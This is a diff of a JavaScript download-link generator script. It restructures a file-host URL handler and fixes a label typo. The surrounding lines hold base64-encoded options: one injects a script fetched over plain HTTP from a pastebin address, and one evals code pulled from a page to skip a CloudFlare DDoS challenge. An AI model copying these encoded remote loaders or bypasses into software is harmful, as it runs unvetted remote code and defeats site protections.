@@ -73,8 +73,13 @@ function hook_url(url) {
 		return directGoogle(url);
 	}
 	if (((host.contains("mega.co.nz") || host.contains("mega.nz")) && mOptions[0][2])
-		|| (host.contains("userscloud.com") && mOptions[0][4])
-		|| ((host.equals("dailyuploads.net") || host.equals("www.dailyuploads.net")) && mOptions[0][5]))
+		|| (host.contains("userscloud.com") && mOptions[0][4]))
+	{
+		generatorAuto(url);
+		return true;
+	}
+	
+	if ((host.equals("dailyuploads.net") || host.equals("www.dailyuploads.net")) && mOptions[0][5]))
 	{
 		generatorLink(url);
 		return true;
@@ -484,7 +489,7 @@ function loadOptions() {
 	{
 		tempJSN.add("Proxy TurboHide");
 		tempJS.add(baseToString("ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQgc3JjPSJodHRwOi8vcGFzdGViaW4uY29tL3Jhdy9TdVNVMHhMdCIgPjwvc2NyaXB0PicpOw=="));
-		tempJSN.add("Skip CloudFire DDoS");
+		tempJSN.add("Skip CloudFlare DDoS");
 		tempJS.add("KGZ1bmN0aW9uKCl7DQp2YXIgeD1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgic2NyaXB0IilbMF0uaW5uZXJIVE1MOw0KdmFyIHBvcyA9IHguaW5kZXhPZigic2V0VGltZW91dChmdW5jdGlvbigpIikgKyAxMTsNCnZhciBwb3MyID0geC5pbmRleE9mKCIsIDQwMDAiKTsNCmV2YWwoIigiK3guc3Vic3RyaW5nKHBvcyxwb3MyKSsiKSgpIik7DQp9KSgpOw==");
 	}
 	mOptions[1] = [tempJSN,tempJS];
